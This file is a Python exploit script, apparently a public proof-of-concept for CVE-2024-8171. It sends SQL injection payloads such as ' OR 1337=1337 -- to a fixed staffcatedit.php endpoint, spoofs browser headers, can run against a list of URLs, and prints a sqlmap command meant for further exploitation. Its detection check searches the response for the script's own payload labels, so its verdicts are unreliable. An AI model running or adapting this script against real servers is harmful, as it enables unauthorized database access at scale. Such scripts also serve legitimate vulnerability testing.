import requests
import sys
from urllib.parse import urlparse
from termcolor import colored

def print_banner():
    """Print the banner."""
    banner = """
 ██████╗██╗   ██╗███████╗    ██████╗  ██████╗ ██████╗ ██╗  ██╗       █████╗  ██╗███████╗ ██╗
██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗╚════██╗██║  ██║      ██╔══██╗███║╚════██║███║
██║     ██║   ██║█████╗█████╗ █████╔╝██║██╔██║ █████╔╝███████║█████╗╚█████╔╝╚██║    ██╔╝╚██║
██║     ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║██╔═══╝ ╚════██║╚════╝██╔══██╗ ██║   ██╔╝  ██║
╚██████╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝███████╗     ██║      ╚█████╔╝ ██║   ██║   ██║
 ╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝ ╚══════╝     ╚═╝       ╚════╝  ╚═╝   ╚═╝   ╚═╝
                                                                                            
    """
    print(banner)

def exploit(url):
    # Parse the URL to get the host and scheme
    parsed_url = urlparse(url)
    host = parsed_url.netloc
    scheme = parsed_url.scheme
    endpoint = "/staffcatedit.php?id=6"  # Fixed endpoint

    # Full URL to send the request to
    target_url = f"{scheme}://{host}{endpoint}"

    # Define the SQL payloads for testing SQL Injection
    payloads = {
        "safe": "1337",
        "sql_injection_true": "' OR 1337=1337 -- ",
        "sql_injection_false": "' OR 1337=1338 -- "
    }

    # Headers that mimic a legitimate request
    headers = {
        'Host': host,
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Referer': f'{scheme}://{host}{endpoint}',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Connection': 'close'
    }

    for key, value in payloads.items():
        # Display details before sending the request
        print(colored(f"[+] Target URL: {target_url}", "green"))
        print(colored(f"[+] Sending POST request with payload: {key}", "green"))
        print(colored(f"[+] Payload: title={value}", "cyan"))

        # Send the POST request
        try:
            response = requests.post(target_url, data={'title': value}, headers=headers)
            print(colored(f"[+] Response Status Code: {response.status_code}", "blue"))
            print(colored(f"[+] Response Body:\n{response.text[:200]}", "magenta"))  # Only showing the first 200 characters
        except requests.exceptions.RequestException as e:
            print(colored(f"[-] An error occurred: {e}", "red"))

        print("\n" + "-"*50 + "\n")

    # Analyze the responses to check for vulnerability
    if response.status_code == 200:
        if "sql_injection_true" in response.text and "sql_injection_false" not in response.text:
            print(colored("[!] Potential SQL Injection vulnerability detected!", "red"))
        else:
            print(colored("[+] No obvious SQL Injection detected.", "green"))
    else:
        print(colored("[-] The server returned a non-200 status code.", "red"))

def main():
    # Display instructions to the user
    print(colored("[*] This script tests for potential SQL Injection vulnerabilities.", "cyan"))
    print(colored("[*] You can provide a URL in the following formats:", "cyan"))
    print(colored("    - http://example.com", "yellow"))
    print(colored("    - https://example.com:8443", "yellow"))
    print(colored("[*] Usage examples:", "cyan"))
    print(colored("    - python3 CVE-2024-8171.py http://example.com", "yellow"))
    print(colored("    - python3 CVE-2024-8171.py -f urls.txt", "yellow"))
    print(colored("\n" + "-"*50 + "\n"))

    if len(sys.argv) < 2:
        print(colored("[-] Usage: python3 CVE-2024-8171.py <url> or python3 CVE-2024-8171.py -f urls.txt", "red"))
        sys.exit(1)

    if sys.argv[1] == '-f':
        # Reading URLs from a file
        file_name = sys.argv[2]
        try:
            with open(file_name, 'r') as f:
                urls = f.readlines()
            for url in urls:
                url = url.strip()
                if url:
                    exploit(url)
        except FileNotFoundError:
            print(colored(f"[-] The file {file_name} does not exist.", "red"))
    else:
        target_url = sys.argv[1]
        exploit(target_url)

    # Provide SQLMap command advice for further exploitation
    print(colored("[*] If a potential SQL Injection vulnerability is detected, you can further exploit it using SQLMap.", "cyan"))
    print(colored("[*] Example SQLMap command:", "cyan"))
    print(colored("    sqlmap -u https://example.com:8443/staffcatedit.php?id=6 --data \"title=1337\" -p \"title\" --method POST --tamper=between --level=5 --risk=3 --banner", "yellow"))
    print(colored("[*] This command will perform a detailed SQL Injection test on the 'title' parameter.", "cyan"))

if __name__ == "__main__":
    main()
